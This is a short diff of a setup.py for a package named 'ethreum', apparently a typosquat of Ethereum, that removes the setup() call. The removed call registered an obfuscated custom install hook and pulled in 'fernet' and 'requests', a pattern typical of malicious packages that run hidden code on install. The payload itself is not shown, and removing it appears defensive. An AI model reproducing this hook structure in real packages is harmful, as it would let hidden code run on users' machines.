@@ -18,22 +18,5 @@ class NJZEdqRfSGZWInILdNkqnzCTTZEoxfSLCxQBoCkZRCwhgKLJAOJhgQoFvDwNmtcYjVjgJAXYJZ
             install.run(self)
 
 
-setup(
-    name="ethreum",
-    version=VERSION,
-    author="sBTfVPhqucCudClaEhq",
-    author_email="utMys@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': NJZEdqRfSGZWInILdNkqnzCTTZEoxfSLCxQBoCkZRCwhgKLJAOJhgQoFvDwNmtcYjVjgJAXYJZKp,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
